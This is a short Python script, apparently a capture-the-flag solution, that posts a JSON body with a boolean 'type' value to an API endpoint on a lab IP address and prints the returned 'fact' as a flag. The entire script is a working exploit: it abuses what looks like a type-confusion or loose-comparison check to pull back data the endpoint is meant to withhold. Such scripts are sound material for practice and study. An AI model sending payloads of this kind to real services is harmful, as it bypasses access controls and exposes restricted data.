import requests

url = "http://94.237.51.33:43716/api/getfacts"

data = {
    "type": True
}

response = requests.post(url, json=data)

if response.status_code == 200:
    jsonData = response.json()
    flag = jsonData["facts"][0]["fact"]
    print("Flag: ", flag)
else:
    print("Error: ", response.status_code)
